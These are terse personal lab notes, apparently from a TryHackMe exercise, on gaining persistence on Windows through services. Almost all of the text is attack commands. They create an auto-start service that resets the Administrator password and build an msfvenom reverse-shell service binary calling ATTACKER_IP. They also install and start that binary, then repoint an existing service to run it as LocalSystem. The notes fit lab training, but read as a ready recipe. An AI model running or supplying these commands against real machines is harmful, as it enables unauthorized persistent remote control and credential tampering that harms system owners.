
->> service is a goodway to enable persistence either create a service or already leverage on an existing one 
creating a service 
==
cmd->> sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice


:>create a service rev shell with msvenom copy and past to victim computer and make service to run with command to create service 
cmd ->> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe

        

cmd ->>sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2


using existing service 
==

get all service 
cmd:>sc.exe query state=all

query servie config 
:> sc.exe qc service name
take not of this criteria 
:>auto start
:>bin path 
:>service strt name ..prefer local system

change bin path
:> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"